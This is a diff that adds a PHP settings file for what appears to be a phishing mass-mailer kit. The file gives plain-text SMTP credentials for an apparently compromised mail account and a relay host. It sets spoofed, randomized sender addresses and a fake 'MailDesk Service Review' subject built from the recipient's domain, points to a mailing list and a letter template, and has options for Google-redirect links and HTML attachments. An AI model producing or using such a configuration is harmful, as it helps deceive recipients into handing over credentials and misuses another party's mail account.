@@ -1,0 +1,51 @@
+<?php
+$SMTP = [
+
+[
+      "SMTP Server" => "barber.ro", //Smtp Server
+      "Username"    => "office@barber.ro", //Smtp Username / ID
+      "Password"    => "barber007", //Smtp Password
+      "Port"        => "587", //Smtp Port
+      "Tls"         => "tls", //Smtp Authentication
+     ],
+         
+         
+   
+];
+
+
+$SETUP = [
+      "Host:Port" => "94.130.73.19:14669",  
+      "Username:Password" =>"user:password",
+      
+      "Key"                    => "Y9kenRw51jmwjrj8oG6V0QMzE6Vgacvte9kRxxgzpekIToFva4kKWlVitnZPozhAfPSTtDCMNBsfm4jRh3L2TnEl15gpdYRE48F1",
+      "Mail Priority"          => 3,
+ 
+      "Time"                   => "America/Adak",
+  
+      "Sleeptime"              => 0,
+   "Mail Limit"             => 100,
+   "Delay Limit"            => 5,
+   
+     "From Name"              => "<DOMAINEMAIL> MailDesk Support01",
+      "Masking From Mail"      => 0,
+      "From Mail"              => "no-reply-{RANDSTRING}-{RANDSTRING}@karadiamond.com",
+      "Mail Subject"           => "<DOMAINEMAIL> MailDesk Service Review. <DATE> ID: #<RANDSTRING>#",
+  
+      "Reply-to"          =>0,
+      "Reply-to Mail"      =>"",
+      "Reply-to Name"      =>"",
+  
+      "Letter"                 => "a.html", 
+      "Maillist"           	   => "b.txt", 
+	  
+	  "Google Redirect"           => 0,
+      "Link G-Redirect"           => "https://yourlink.com/?email=", // The will be AUTOMATICALLY !
+
+      "Send Attachment"        => 0, 
+      "Autolink Attachment"    => 0,//turn 1 if u want to use autolink attachment
+      "File Attachment"        => "attachment/attachment",//directory and the name file before encryption 
+      "Name Attachment"        => "attachment.html",
+  
+      "Link"                   => [""],
+];
